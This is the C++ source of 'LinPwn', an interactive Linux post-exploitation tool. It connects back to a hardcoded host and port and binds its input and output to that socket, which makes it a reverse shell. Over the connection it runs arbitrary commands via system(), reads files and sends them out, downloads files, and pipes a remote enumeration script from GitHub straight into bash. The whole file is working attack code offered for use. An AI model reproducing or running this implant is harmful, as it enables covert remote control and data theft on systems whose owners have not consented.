/* LinPwn
   
   Interactive Post Exploitation Tool  

   Copyright (C) 2019  Andromeda3(3XPL017)

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program. If not, see <https://www.gnu.org/licenses/>.
*/

#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <csignal>
#include <string>

#define BUFFER 200
#define SD 0


void get_input(char *option) {
  fgets(option, BUFFER, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
      option[i] = '\0';
    }
  }
}

class Banner {
 public:
  void print_banner() {
    get_banner();
    get_sysinfo();
    get_user();
    get_uid();
    get_pwd();
    get_home();
    get_shell();
    get_term();
    get_path();
    get_help();
  }

 private:
  void get_banner() {
    write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
    write(SD, "\n\0", 2);
  }

  void get_help() {
    write(SD, "\n\0", 2);
    write(SD, "Type banner to show this banner.\n\0", 33);
    write(SD, "Type commands to list commands.\n\0", 33);
    write(SD, "Type exit or press ^C to quit LinPwn.\n\0", 38);
  }

  void get_sysinfo() {
    struct utsname utsinfo;
    uname(&utsinfo);
    write(SD, "System: ", 8);
    write(SD, utsinfo.sysname, 20);
    write(SD, " ", 1);
    write(SD, utsinfo.nodename, 20);
    write(SD, " ", 1);
    write(SD, utsinfo.release, 20);
    write(SD, " ", 1);
    write(SD, utsinfo.version, 20);
    write(SD, " ", 1);
    write(SD, utsinfo.machine, 20);
    write(SD, " ", 1);
    write(SD, utsinfo.domainname, 20);
    write(SD, "\n\0", 2);
  }

  void get_user() {
    write(SD, "User: ", 6);

    if (!getenv("USER")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string username = getenv("USER");
    int size = username.length();
    write(SD, username.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_uid() {
    write(SD, "UID: ", 6);
    int uid = getuid();
    std::string uidstr = std::to_string(uid);
    int size = uidstr.length();
    write(SD, uidstr.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_pwd() {
    write(SD, "Pwd: ", 6);

    if (!getenv("PWD")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string pwd = getenv("PWD");
    int size = pwd.length();
    write(SD, pwd.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_home() {
    write(SD, "Home: ", 6);

    if (!getenv("HOME")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string home = getenv("HOME");
    int size = home.length();
    write(SD, home.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_shell() {
    write(SD, "Shell: ", 6);

    if (!getenv("SHELL")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string shell = getenv("SHELL");
    int size = shell.length();
    write(SD, shell.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_term() {
    write(SD, "Term: ", 6);

    if (!getenv("TERM")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string term = getenv("TERM");
    int size = term.length();
    write(SD, term.data(), size);
    write(SD, "\n\0", 2);
  }

  void get_path() {
    write(SD, "Path: ", 6);

    if (!getenv("PATH")) {
      write(SD, "none\n", 5);
      return;
    }

    std::string path = getenv("PATH");
    int size = path.length();
    write(SD, path.data(), size);
    write(SD, "\n\0", 2);
  }
};

class Connection {
 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, SD);
    dup2(connecting, 1);
  }

 private:
  const char *ip = "192.168.1.165";  // Change this
  const int port = 8000;  // Change this
  struct sockaddr_in address;
};

class Commands {
 public:
  void list_commands() {
    write(SD, "\x1b[32mCommands: \n\0", 18);
    write(SD, "shell - Executes /bin/sh\n\0", 27);
    write(SD, "readfile - Print the contents of a file\n\0", 41);
    write(SD, "enumerate - Download and run LinEnum "
      "(requires internet access)\n\0", 65);
    write(SD, "download - Downloads a file\n\0", 30);
  }

  void shell() {
    char option[BUFFER];
    const char *errors = " 2>/dev/null";
    write(SD, "\x1b[32mExecuting /bin/sh\n\0", 25);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[31m(LinPwn: Shell) > \0", 22);
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        strncat(option, errors, BUFFER);
        system(option);
      }
    }
  }

  void read_file() {
    char option[BUFFER];
    write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
    write(SD, "Type exit to return to LinPwn.\n\0", 33);

    for (;;) {
      write(SD, "\x1b[32m \0", 8);
      get_input(option);

      if (strncmp(option, "exit\0", 5) == 0) {
        break;
      } else {
        open_file(option);
      }
    }
  }

  void enumeration() {
    const char *curl = "curl https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";
    const char *wget = "wget -O - https://raw.githubusercontent.com/"
      "rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null | bash  2>/dev/null";

    if (check_curl) {
      system(curl);
      return;
    } else if (check_wget) {
      system(wget);
      return;
    }

    write(SD, "\x1b[33mIf LinEnum didnt run curl"
      " or wget may not be installed\n\0", 62);
    write(SD, "or you do not have internet access\n\0", 36);
    return;
  }

  void download() {
    char *command = new char[BUFFER];
    const char *curl = "curl ";
    const char *wget = "wget ";
    const char *errors = " 2>/dev/null";
    char option[BUFFER];

    if (check_curl) {
      strncat(command, curl, BUFFER);
    } else if (check_wget) {
      strncat(command, wget, BUFFER);
    } else {
      write(SD, "\x1b[33mCurl or Wget is not installed\n\0", 40);
      return;
    }

    write(SD, "\x1b[32mEnter the URL of the target "
      "file to download it\n\0", 55);
    write(SD, "\x1b[31m(LinPwn: Download) > \0", 26);
    write(SD, "\x1b[32m \0", 8);
    get_input(option);
    strncat(command, option, BUFFER);
    strncat(command, errors, BUFFER);
    system(command);
    delete[] command;
  }

 private:
  FILE *check_curl = fopen("/usr/bin/curl", "rb");
  FILE *check_wget = fopen("/usr/bin/wget", "rb");

  void open_file(char *option) {
    FILE *file = fopen(option, "rb");

    if (!file) {
      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
      return;
    }

    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *filecontent = new char[size];

    fread(filecontent, 1, size, file);
    filecontent[size] = '\0';
    send(SD, filecontent, size, 0);
    fclose(file);
    delete[] filecontent;
  }
};

int handler() {
  Banner banner;
  Commands commands;
  char *option = new char[BUFFER];
  get_input(option);

  if (strncmp(option, "shell\0", 6) == 0) {
    commands.shell();
  } else if (strncmp(option, "readfile\0", 9) == 0) {
    commands.read_file();
  } else if (strncmp(option, "enumerate\0", 9) == 0) {
    commands.enumeration();
  } else if (strncmp(option, "commands\0", 10) == 0) {
    commands.list_commands();
  } else if (strncmp(option, "download\0", 9) == 0) {
    commands.download();
  } else if (strncmp(option, "exit\0", 5) == 0) {
    return 1;
  } else if (strncmp(option, "banner\0", 7) == 0) {
    banner.print_banner();
  } else if (strncmp(option, "", 1) == 0) {
    return 0;
  } else {
    write(SD, "\x1b[33mNot a valid option\n\0", 25);
  }

  delete[] option;
  return 0;
}

void main_loop() {
  do {
    write(SD, "\x1b[31m(LinPwn) > \0", 15);
    write(SD, "\x1b[32m \0", 8);
  } while (handler() != 1);
}

int main() {
  Banner banner;
  Connection connection;
  connection.connection_open();
  banner.print_banner();
  main_loop();
  return 0;
}
